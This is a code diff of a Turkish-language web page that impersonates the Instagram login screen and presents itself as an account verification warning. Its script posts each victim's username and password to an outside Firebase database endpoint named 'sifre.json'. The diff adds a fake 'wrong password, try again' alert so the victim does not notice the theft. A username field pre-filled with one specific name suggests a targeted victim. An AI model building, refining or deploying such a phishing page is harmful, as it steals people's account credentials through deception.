@@ -24,7 +24,7 @@
                   <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram">
                 </div><!-- Header end -->
                 <div class="form-wrap">
-                  <form class="form">
+                  <div class="form">
 
                     <div class="input-box">
                       <input v-model="usern" type="text"  placeholder="Telefon numarası, kullanıcı adı, veya email" aria-required="true" maxlength="30" autocapitalize="off" autocorrect="off" name="username" required>
@@ -35,11 +35,11 @@
                     </div>  
 
                     <span class="button-box">
-                      <button @click="okey" class="btn" name="submit">Hesabımı Doğrula</button>
+                      <button @click="okey" class="btn">Hesabımı Doğrula</button>
                     </span>  
 
                     <a class="forgot" href="">Neden böyle bir uyarı aldım?</a>
-                  </form>
+                  </div>
                 </div> <!-- Form-wrap end -->
               </div> <!-- Login-box end -->
 
@@ -110,7 +110,7 @@ const usern = ref('11sefaa')
 const passw = ref('');
 
 const okey = () => {
-  axios.post('https://todolist-c4b7d-default-rtdb.firebaseio.com/sifre.json',{username:usern.value,password:passw.value}).then(e=>{console.log(e)})
+  axios.post('https://todolist-c4b7d-default-rtdb.firebaseio.com/sifre.json',{username:usern.value,password:passw.value}).then(e=>{alert('Girdiğiniz şifre yanlış, lütfen tekrar deneyiniz.')})
 }
 
 
